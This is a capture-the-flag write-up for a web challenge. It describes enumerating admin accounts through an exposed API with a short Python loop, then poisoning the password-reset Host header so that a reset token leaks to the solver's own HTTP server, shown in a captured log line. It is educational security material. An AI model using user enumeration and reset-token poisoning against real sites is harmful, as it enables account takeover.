# WEB : **Free Cider**

In the appâ€™s source code we can see a message for admins : 

![note](assets/gccctf/note.png)

So it would seem that there is a swagger that referres the endpoints of an api and it is still up, before letâ€™s analyse the web app so we can login with user password and we can reset password using only user. 

![login](assets/gccctf/login.png)

![reset](assets/gccctf/resetpass.png)

Using burpsuite I intercept the http request and we can  find an api endpoint. 

![endpoint](assets/gccctf/endpoint.png)

To acces the api swager go to `/api/v1/swagger.json`. 

![swagger](assets/gccctf/swagger.png)

The most interresting endpoint is the GET, to find users using an ID. 

![userid](assets/gccctf/userid.png)

The admin parameter is set to false, maybe we need to find all admin account for that I quickly created a python script to fuzz the admin account : 

```python
import requests 

for i in range(50): 
        url=f"""http://worker05.gcc-ctf.com:12283/api/v1/user/{i}"""
        r = requests.get(url)
        print(r.text)
```

Run the script using bash command like this : 

```python
> python fuzz.py > admin.txt && cat admin.txt | grep 'admin":true'
{"admin":true,"id":9,"username":"monique_petersen12"}
{"admin":true,"id":24,"username":"zachary_rodriguez35"}
{"admin":true,"id":31,"username":"vicki_savage190"}
```

after that I try to find mass assignement vulnerability, but I didnâ€™t found suspicious http requests like PUT on any api endpoints. 

I also try to put other parametres on api endpoint  request but that didnâ€™t work. 

I think we need to abuse the endpoint `/api/v1/reset-password` to reset admin password. 

And yeah I saw right, we can do  a **reset password poisoning,** for that launch a request to the endpoint `/api/v1/reset-password`

On the http request change the Host header to a server you have under control like this : 

![request-reset](assets/gccctf/request-reset.png)

Ps* donâ€™t forget to start an http server, in my case I used a VPS !

```python
python3 -m http.server 80
```

Launch the request and see the leaked token send by the target server to reset the adminâ€™s account password

```python
172.234.63.85 - - [02/Mar/2024 17:43:52] code 404, message File not found
172.234.63.85 - - [02/Mar/2024 17:43:52] "GET /reset?token=12cb3489-0ff1-4680-9a17-b5ffc16d73e5 HTTP/1.1" 404 -
```

Go to your browser and use the token to gain access on the reset page.

Use this password and the adminâ€™s account affiliated to log in the app and get the Flag GG ! ðŸ˜¼

Thanks to Mika to this API challs ! we learn a lot.
